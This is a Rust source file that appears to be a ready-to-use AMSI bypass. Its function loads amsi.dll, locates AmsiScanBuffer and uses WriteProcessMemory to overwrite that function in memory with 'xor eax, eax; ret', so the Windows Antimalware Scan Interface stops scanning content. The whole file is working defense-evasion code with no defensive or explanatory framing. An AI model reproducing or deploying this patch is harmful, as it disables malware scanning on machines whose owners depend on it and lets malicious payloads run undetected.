use std::ffi::c_void;

use windows::Win32::{
    Foundation::E_UNEXPECTED,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Threading::GetCurrentProcess,
    },
};
use windows_core::s;

pub fn patch_amsi() -> windows_core::Result<()> {
    let hmodule = unsafe { LoadLibraryA(s!("amsi.dll"))? };

    let addr = match unsafe { GetProcAddress(hmodule, s!("AmsiScanBuffer")) } {
        Some(a) => a,
        None => {
            return Err(windows_core::Error::new(
                E_UNEXPECTED,
                "GetProcAddress failed.",
            ));
        }
    };

    // xor eax, eax
    // ret
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];

    unsafe {
        WriteProcessMemory(
            GetCurrentProcess(),
            addr as *const c_void,
            patch.as_ptr() as *const c_void,
            patch.len(),
            None,
        )
    }
}
